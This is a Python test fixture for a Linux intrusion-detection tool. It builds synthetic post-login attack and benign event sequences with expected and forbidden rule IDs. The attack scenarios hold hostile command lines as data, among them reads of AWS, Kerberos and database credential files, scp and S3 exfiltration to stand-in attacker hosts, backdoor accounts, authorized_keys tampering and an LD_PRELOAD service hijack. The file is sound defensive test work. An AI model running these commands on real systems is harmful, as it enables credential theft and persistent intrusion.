import sys
import time
from pathlib import Path
from typing import List

sys.path.insert(0, str(Path(__file__).parent.parent.parent))

from core.normalize import NormalizedEvent

from tests.coverage.credential_access_helper import CoverageScenario


def _auth_evt(
    ts,
    *,
    action="ssh_login",
    outcome="success",
    user="alice",
    host="post-auth-host",
    src_ip="203.0.113.10",
    source="auth.log",
    distro_family="unknown",
):
    return NormalizedEvent(
        ts=ts,
        host=host,
        src_ip=src_ip,
        source=source,
        category="auth",
        action=action,
        outcome=outcome,
        user=user,
        message=f"{action}:{outcome}",
        fields={},
        distro_family=distro_family,
    )


def _proc_evt(
    ts,
    cmdline,
    *,
    host="post-auth-host",
    user="alice",
    process=None,
    source="journald",
    action="process_exec",
    outcome="success",
    fields=None,
    distro_family="unknown",
):
    merged_fields = {"cmdline": cmdline}
    if fields:
        merged_fields.update(fields)
    return NormalizedEvent(
        ts=ts,
        host=host,
        source=source,
        category="process",
        action=action,
        outcome=outcome,
        user=user,
        process=process or cmdline.split()[0],
        message=cmdline,
        fields=merged_fields,
        distro_family=distro_family,
    )


def _sudo_evt(ts, sudo_command, *, host="post-auth-host", user="alice"):
    return NormalizedEvent(
        ts=ts,
        host=host,
        source="auth.log",
        category="auth",
        action="sudo",
        outcome="success",
        user=user,
        process="sudo",
        message=f"sudo:{sudo_command}",
        fields={"sudo_command": sudo_command},
    )


def _su_evt(ts, *, host="post-auth-host", user="alice", target="root"):
    return NormalizedEvent(
        ts=ts,
        host=host,
        source="auth.log",
        category="auth",
        action="su",
        outcome="success",
        user=user,
        process="su",
        message=f"su:{target}",
        fields={"su_target": target},
    )


def build_attack_scenarios() -> List[CoverageScenario]:
    now = time.time()
    return [
        CoverageScenario(
            name="ssh-discovery-then-secret-read",
            events=[
                _auth_evt(now + 1, action="ssh_login", host="post-auth-attack-01"),
                _proc_evt(now + 6, "sudo -l && getent group sudo", host="post-auth-attack-01", process="bash"),
                _proc_evt(now + 11, "cat /srv/app/.env", host="post-auth-attack-01", process="cat"),
            ],
            expected_ids={"SEQ-046"},
            forbidden_ids=set(),
            kind="attack",
        ),
        CoverageScenario(
            name="vpn-discovery-then-su-root",
            events=[
                _auth_evt(now + 20, action="vpn_login", host="post-auth-attack-02"),
                _proc_evt(now + 25, "find / -name kubeconfig", host="post-auth-attack-02", process="find"),
                _su_evt(now + 30, host="post-auth-attack-02"),
            ],
            expected_ids={"SEQ-046", "SEQ-036"},
            forbidden_ids=set(),
            kind="attack",
        ),
        CoverageScenario(
            name="identity-discovery-then-aws-credentials",
            events=[
                _auth_evt(now + 40, action="identity_login", host="post-auth-attack-03"),
                _proc_evt(now + 45, "netstat -tulpn", host="post-auth-attack-03", process="netstat"),
                _proc_evt(now + 50, "cat /home/alice/.aws/credentials", host="post-auth-attack-03", process="cat"),
            ],
            expected_ids={"SEQ-046"},
            forbidden_ids=set(),
            kind="attack",
        ),
        CoverageScenario(
            name="ssh-discovery-then-temp-stage",
            events=[
                _auth_evt(now + 60, action="ssh_login", host="post-auth-attack-04"),
                _proc_evt(now + 65, "cat /etc/sudoers", host="post-auth-attack-04", process="cat"),
                _proc_evt(now + 70, "tar czf /tmp/loot.tgz /srv/app/.env", host="post-auth-attack-04", process="tar"),
            ],
            expected_ids={"SEQ-046"},
            forbidden_ids=set(),
            kind="attack",
        ),
        CoverageScenario(
            name="ssh-secret-read-then-scp",
            events=[
                _auth_evt(now + 80, action="ssh_login", host="post-auth-attack-05"),
                _proc_evt(now + 85, "cat /home/alice/.aws/credentials", host="post-auth-attack-05", process="cat"),
                _proc_evt(now + 90, "scp /tmp/loot.tgz attacker@198.51.100.93:/tmp/loot.tgz", host="post-auth-attack-05", process="scp"),
            ],
            expected_ids={"SEQ-054"},
            forbidden_ids=set(),
            kind="attack",
        ),
        CoverageScenario(
            name="vpn-pgpass-then-temp-archive",
            events=[
                _auth_evt(now + 100, action="vpn_login", host="post-auth-attack-06"),
                _proc_evt(now + 105, "cat /home/alice/.pgpass", host="post-auth-attack-06", process="cat"),
                _proc_evt(now + 110, "tar czf /tmp/db.tgz /home/alice/.pgpass", host="post-auth-attack-06", process="tar"),
            ],
            expected_ids={"SEQ-054"},
            forbidden_ids=set(),
            kind="attack",
        ),
        CoverageScenario(
            name="identity-keytab-then-aws-s3-cp",
            events=[
                _auth_evt(now + 120, action="identity_login", host="post-auth-attack-07"),
                _proc_evt(now + 125, "cp /etc/krb5.keytab /tmp/krb5.keytab", host="post-auth-attack-07", user="alice", process="cp"),
                _proc_evt(now + 130, "aws s3 cp /tmp/krb5.keytab s3://attacker-bucket/krb5.keytab", host="post-auth-attack-07", user="alice", process="aws"),
            ],
            expected_ids={"SEQ-054"},
            forbidden_ids=set(),
            kind="attack",
        ),
        CoverageScenario(
            name="debian-authlog-discovery-then-apt-auth-read",
            events=[
                _auth_evt(now + 121, action="ssh_login", host="post-auth-attack-07b", distro_family="debian"),
                _proc_evt(now + 126, "grep COMMAND= /var/log/auth.log", host="post-auth-attack-07b", user="alice", process="grep", distro_family="debian"),
                _proc_evt(now + 131, "cat /etc/apt/auth.conf", host="post-auth-attack-07b", user="alice", process="cat", distro_family="debian"),
            ],
            expected_ids={"SEQ-046"},
            forbidden_ids=set(),
            kind="attack",
        ),
        CoverageScenario(
            name="rhel-secure-log-discovery-then-rhsm-stage",
            events=[
                _auth_evt(now + 122, action="identity_login", host="post-auth-attack-07c", distro_family="rhel"),
                _proc_evt(now + 127, "grep COMMAND= /var/log/secure", host="post-auth-attack-07c", user="alice", process="grep", distro_family="rhel"),
                _proc_evt(now + 132, "cp /etc/rhsm/rhsm.conf /tmp/rhsm.conf", host="post-auth-attack-07c", user="alice", process="cp", distro_family="rhel"),
            ],
            expected_ids={"SEQ-046"},
            forbidden_ids=set(),
            kind="attack",
        ),
        CoverageScenario(
            name="suse-journal-discovery-then-zypp-credential-copy",
            events=[
                _auth_evt(now + 123, action="vpn_login", host="post-auth-attack-07d", distro_family="suse"),
                _proc_evt(now + 128, "journalctl -u sshd --since -15min", host="post-auth-attack-07d", user="alice", process="journalctl", distro_family="suse"),
                _proc_evt(now + 133, "cp /etc/zypp/credentials.d/SCCcredentials /tmp/SCCcredentials", host="post-auth-attack-07d", user="alice", process="cp", distro_family="suse"),
            ],
            expected_ids={"SEQ-046"},
            forbidden_ids=set(),
            kind="attack",
        ),
        CoverageScenario(
            name="ssh-login-then-sudo-group-add",
            events=[
                _auth_evt(now + 140, action="ssh_login", host="post-auth-attack-08"),
                _proc_evt(now + 145, "usermod -aG sudo bob", host="post-auth-attack-08", process="usermod"),
            ],
            expected_ids={"SEQ-055"},
            forbidden_ids=set(),
            kind="attack",
        ),
        CoverageScenario(
            name="vpn-login-then-authorized-keys",
            events=[
                _auth_evt(now + 160, action="vpn_login", host="post-auth-attack-09"),
                _proc_evt(now + 165, "tee /home/alice/.ssh/authorized_keys", host="post-auth-attack-09", process="tee"),
            ],
            expected_ids={"SEQ-055"},
            forbidden_ids=set(),
            kind="attack",
        ),
        CoverageScenario(
            name="identity-login-then-sudoersd-change",
            events=[
                _auth_evt(now + 180, action="identity_login", host="post-auth-attack-10"),
                _proc_evt(now + 185, "visudo -f /etc/sudoers.d/alice", host="post-auth-attack-10", process="visudo"),
            ],
            expected_ids={"SEQ-055"},
            forbidden_ids=set(),
            kind="attack",
        ),
        CoverageScenario(
            name="ssh-login-then-useradd",
            events=[
                _auth_evt(now + 200, action="ssh_login", host="post-auth-attack-11"),
                _proc_evt(now + 205, "useradd -m svc-backdoor", host="post-auth-attack-11", user="alice", process="useradd"),
            ],
            expected_ids={"SEQ-055"},
            forbidden_ids=set(),
            kind="attack",
        ),
        CoverageScenario(
            name="identity-login-then-gpasswd-admin-group",
            events=[
                _auth_evt(now + 220, action="identity_login", host="post-auth-attack-12"),
                _proc_evt(now + 225, "gpasswd -a bob docker", host="post-auth-attack-12", user="alice", process="gpasswd"),
            ],
            expected_ids={"SEQ-055"},
            forbidden_ids=set(),
            kind="attack",
        ),
        CoverageScenario(
            name="debian-discovery-sudo-su-then-secret-read",
            events=[
                _auth_evt(now + 240, action="ssh_login", host="post-auth-attack-13", distro_family="debian"),
                _proc_evt(now + 245, "sudo -l && getent group sudo && cat /etc/sudoers.d", host="post-auth-attack-13", process="bash", distro_family="debian"),
                _proc_evt(now + 250, "sudo su -", host="post-auth-attack-13", process="sudo", distro_family="debian"),
                _proc_evt(now + 255, "cat /root/.aws/credentials", host="post-auth-attack-13", user="root", process="cat", distro_family="debian"),
            ],
            expected_ids={"SEQ-067"},
            forbidden_ids=set(),
            kind="attack",
        ),
        CoverageScenario(
            name="suse-discovery-doas-then-sudoersd-change",
            events=[
                _auth_evt(now + 260, action="identity_login", host="post-auth-attack-14", distro_family="suse"),
                _proc_evt(now + 265, "doas -L && getent group wheel", host="post-auth-attack-14", process="sh", distro_family="suse"),
                _proc_evt(now + 270, "doas -s", host="post-auth-attack-14", process="doas", distro_family="suse"),
                _proc_evt(now + 275, "visudo -f /etc/sudoers.d/alice", host="post-auth-attack-14", user="root", process="visudo", distro_family="suse"),
            ],
            expected_ids={"SEQ-067"},
            forbidden_ids=set(),
            kind="attack",
        ),
        CoverageScenario(
            name="rhel-login-privesc-account-manip-then-authorized-keys",
            events=[
                _auth_evt(now + 280, action="ssh_login", host="post-auth-attack-15", distro_family="rhel"),
                _proc_evt(now + 285, "sudo su -", host="post-auth-attack-15", process="sudo", distro_family="rhel"),
                _proc_evt(now + 290, "usermod -U -s /bin/bash -d /home/bob -m bob", host="post-auth-attack-15", user="root", process="usermod", distro_family="rhel"),
                _proc_evt(now + 295, "tee /home/bob/.ssh/authorized_keys", host="post-auth-attack-15", user="root", process="tee", distro_family="rhel"),
            ],
            expected_ids={"SEQ-068"},
            forbidden_ids=set(),
            kind="attack",
        ),
        CoverageScenario(
            name="debian-login-account-abuse-then-service-hijack",
            events=[
                _auth_evt(now + 300, action="ssh_login", host="post-auth-attack-16", distro_family="debian"),
                _proc_evt(now + 305, "usermod -aG sudo bob", host="post-auth-attack-16", user="root", process="usermod", distro_family="debian"),
                _proc_evt(now + 310, "printf '[Service]\\nEnvironment=LD_PRELOAD=/tmp/evil.so\\n' > /etc/systemd/system/ssh.service.d/override.conf", host="post-auth-attack-16", user="root", process="printf", distro_family="debian"),
                _proc_evt(now + 315, "systemctl daemon-reload && systemctl restart ssh", host="post-auth-attack-16", user="root", process="systemctl", distro_family="debian"),
            ],
            expected_ids={"SEQ-069"},
            forbidden_ids=set(),
            kind="attack",
        ),
    ]


def build_benign_scenarios() -> List[CoverageScenario]:
    now = time.time()
    return [
        CoverageScenario(
            name="ssh-interactive-admin-routine",
            events=[
                _auth_evt(now + 301, action="ssh_login", host="post-auth-benign-01"),
                _proc_evt(now + 306, "ls /var/log && uptime", host="post-auth-benign-01", process="bash"),
                _proc_evt(now + 311, "sudo /bin/ls /root", host="post-auth-benign-01", process="sudo"),
            ],
            expected_ids=set(),
            forbidden_ids={"SEQ-046"},
            kind="benign",
        ),
        CoverageScenario(
            name="vpn-discovery-then-ansible-maintenance",
            events=[
                _auth_evt(now + 320, action="vpn_login", host="post-auth-benign-02"),
                _proc_evt(now + 325, "sudo -l && getent group sudo", host="post-auth-benign-02", process="bash"),
                _proc_evt(now + 330, "ansible-playbook maintenance.yml", host="post-auth-benign-02", process="ansible-playbook"),
            ],
            expected_ids=set(),
            forbidden_ids={"SEQ-046"},
            kind="benign",
        ),
        CoverageScenario(
            name="identity-discovery-then-backup-rsync",
            events=[
                _auth_evt(now + 340, action="identity_login", host="post-auth-benign-03"),
                _proc_evt(now + 345, "ss -tulpn", host="post-auth-benign-03", process="ss"),
                _proc_evt(now + 350, "rsync /var/backups/etc-nightly.tgz backup@198.51.100.60:/srv/backup/", host="post-auth-benign-03", user="root", process="rsync"),
            ],
            expected_ids=set(),
            forbidden_ids={"SEQ-046"},
            kind="benign",
        ),
        CoverageScenario(
            name="ssh-kubectl-config-view",
            events=[
                _auth_evt(now + 360, action="ssh_login", host="post-auth-benign-04"),
                _proc_evt(now + 365, "kubectl config view --kubeconfig /home/alice/.kube/config", host="post-auth-benign-04", process="kubectl"),
            ],
            expected_ids=set(),
            forbidden_ids={"SEQ-054"},
            kind="benign",
        ),
        CoverageScenario(
            name="vpn-aws-configure",
            events=[
                _auth_evt(now + 380, action="vpn_login", host="post-auth-benign-05"),
                _proc_evt(now + 385, "aws configure --profile admin", host="post-auth-benign-05", user="root", process="aws"),
            ],
            expected_ids=set(),
            forbidden_ids={"SEQ-054"},
            kind="benign",
        ),
        CoverageScenario(
            name="identity-mysql-normal-use",
            events=[
                _auth_evt(now + 400, action="identity_login", host="post-auth-benign-06"),
                _proc_evt(now + 405, "mysql --defaults-file=/root/.my.cnf appdb", host="post-auth-benign-06", user="root", process="mysql"),
            ],
            expected_ids=set(),
            forbidden_ids={"SEQ-054"},
            kind="benign",
        ),
        CoverageScenario(
            name="debian-login-package-maintenance",
            events=[
                _auth_evt(now + 401, action="ssh_login", host="post-auth-benign-06b", distro_family="debian"),
                _proc_evt(now + 406, "apt-get install --yes openssh-server && systemctl daemon-reload && systemctl restart ssh", host="post-auth-benign-06b", user="root", process="apt-get", distro_family="debian"),
            ],
            expected_ids=set(),
            forbidden_ids={"SEQ-046"},
            kind="benign",
        ),
        CoverageScenario(
            name="rhel-login-package-maintenance",
            events=[
                _auth_evt(now + 407, action="identity_login", host="post-auth-benign-06c", distro_family="rhel"),
                _proc_evt(now + 412, "dnf update -y openssh-server && systemctl daemon-reload && systemctl restart sshd", host="post-auth-benign-06c", user="root", process="dnf", distro_family="rhel"),
            ],
            expected_ids=set(),
            forbidden_ids={"SEQ-046"},
            kind="benign",
        ),
        CoverageScenario(
            name="suse-login-package-maintenance",
            events=[
                _auth_evt(now + 413, action="vpn_login", host="post-auth-benign-06d", distro_family="suse"),
                _proc_evt(now + 418, "zypper update -y cron && systemctl daemon-reload && systemctl restart cron", host="post-auth-benign-06d", user="root", process="zypper", distro_family="suse"),
            ],
            expected_ids=set(),
            forbidden_ids={"SEQ-046"},
            kind="benign",
        ),
        CoverageScenario(
            name="ssh-psql-normal-use",
            events=[
                _auth_evt(now + 420, action="ssh_login", host="post-auth-benign-07"),
                _proc_evt(now + 425, "psql service=prod passfile=/home/alice/.pgpass", host="post-auth-benign-07", process="psql"),
            ],
            expected_ids=set(),
            forbidden_ids={"SEQ-054"},
            kind="benign",
        ),
        CoverageScenario(
            name="ssh-config-management-account-change",
            events=[
                _auth_evt(now + 440, action="ssh_login", host="post-auth-benign-08"),
                _proc_evt(now + 445, "ansible-playbook users.yml && visudo -f /etc/sudoers.d/alice", host="post-auth-benign-08", process="ansible-playbook"),
            ],
            expected_ids=set(),
            forbidden_ids={"SEQ-055"},
            kind="benign",
        ),
        CoverageScenario(
            name="vpn-chef-usermod",
            events=[
                _auth_evt(now + 460, action="vpn_login", host="post-auth-benign-09"),
                _proc_evt(now + 465, "chef-client && usermod -aG sudo bob", host="post-auth-benign-09", user="root", process="chef-client"),
            ],
            expected_ids=set(),
            forbidden_ids={"SEQ-055"},
            kind="benign",
        ),
        CoverageScenario(
            name="identity-salt-authorized-keys-management",
            events=[
                _auth_evt(now + 480, action="identity_login", host="post-auth-benign-10"),
                _proc_evt(now + 485, "salt-call state.apply sshkeys path=/home/alice/.ssh/authorized_keys", host="post-auth-benign-10", user="root", process="salt-call"),
            ],
            expected_ids=set(),
            forbidden_ids={"SEQ-055"},
            kind="benign",
        ),
        CoverageScenario(
            name="rhel-discovery-then-chef-wheel-management",
            events=[
                _auth_evt(now + 500, action="ssh_login", host="post-auth-benign-11", distro_family="rhel"),
                _proc_evt(now + 505, "sudo -l && getent group wheel", host="post-auth-benign-11", process="bash", distro_family="rhel"),
                _proc_evt(now + 510, "chef-client && usermod -aG wheel bob", host="post-auth-benign-11", user="root", process="chef-client", distro_family="rhel"),
            ],
            expected_ids=set(),
            forbidden_ids={"SEQ-067"},
            kind="benign",
        ),
        CoverageScenario(
            name="debian-login-system-user-maintenance",
            events=[
                _auth_evt(now + 520, action="ssh_login", host="post-auth-benign-12", distro_family="debian"),
                _proc_evt(now + 525, "ansible-playbook users.yml && useradd --system --shell /usr/sbin/nologin svc-app", host="post-auth-benign-12", user="root", process="ansible-playbook", distro_family="debian"),
                _proc_evt(now + 530, "systemctl preset app.service", host="post-auth-benign-12", user="root", process="systemctl", distro_family="debian"),
            ],
            expected_ids=set(),
            forbidden_ids={"SEQ-068"},
            kind="benign",
        ),
        CoverageScenario(
            name="suse-login-routine-daemon-restart",
            events=[
                _auth_evt(now + 540, action="ssh_login", host="post-auth-benign-13", distro_family="suse"),
                _proc_evt(now + 545, "zypper update -y cron && systemctl daemon-reload && systemctl restart cron", host="post-auth-benign-13", user="root", process="zypper", distro_family="suse"),
            ],
            expected_ids=set(),
            forbidden_ids={"SEQ-069"},
            kind="benign",
        ),
    ]
